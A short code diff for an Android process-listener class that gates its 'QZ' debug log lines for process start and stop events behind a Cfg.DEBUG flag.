@@ -19,6 +19,7 @@ import android.util.Log;
 import com.android.service.ProcessInfo;
 import com.android.service.ProcessStatus;
 import com.android.service.RunningProcesses;
+import com.android.service.auto.Cfg;
 
 public class ListenerProcess extends Listener<ProcessInfo> {
 	/** The Constant TAG. */
@@ -76,7 +77,7 @@ public class ListenerProcess extends Listener<ProcessInfo> {
 
 				currentRunning.put(running.processName, running);
 				if (!lastRunning.containsKey(running.processName)) {
-					Log.d("QZ", TAG + " (notification): started " + running.processName);
+					if(Cfg.DEBUG) Log.d("QZ", TAG + " (notification): started " + running.processName);
 					dispatch(new ProcessInfo(running, ProcessStatus.START));
 				} else {
 					lastRunning.remove(running.processName);
@@ -86,7 +87,7 @@ public class ListenerProcess extends Listener<ProcessInfo> {
 
 		for (Iterator iter = lastRunning.keySet().iterator(); iter.hasNext();) {
 			RunningAppProcessInfo norun = (RunningAppProcessInfo) lastRunning.get(iter.next());
-			Log.d("QZ", TAG + " (notification): stopped " + norun.processName);
+			if(Cfg.DEBUG) Log.d("QZ", TAG + " (notification): stopped " + norun.processName);
 			super.dispatch(new ProcessInfo(norun, ProcessStatus.STOP));
 		}
 
